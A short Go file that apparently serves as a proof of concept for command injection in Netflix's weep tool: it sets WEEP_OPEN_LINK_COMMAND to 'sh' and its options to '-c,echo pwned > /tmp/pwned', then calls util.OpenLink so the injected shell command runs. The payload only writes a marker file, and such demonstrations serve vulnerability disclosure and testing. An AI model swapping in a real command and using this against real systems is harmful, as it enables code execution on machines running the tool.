package main

import (
	"fmt"
	"os"
	"runtime"

	"github.com/netflix/weep/pkg/util"
)

func init() {
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		os.Setenv("WEEP_OPEN_LINK_COMMAND", "sh")
		os.Setenv("WEEP_OPEN_LINK_OPTIONS", "-c,echo pwned > /tmp/pwned")
	}
}

func main() {
	fmt.Println("Running OpenLink with injected options...")
	err := util.OpenLink("https://example.com")
	if err != nil {
		fmt.Printf("Error: %v\n", err)
	}
}
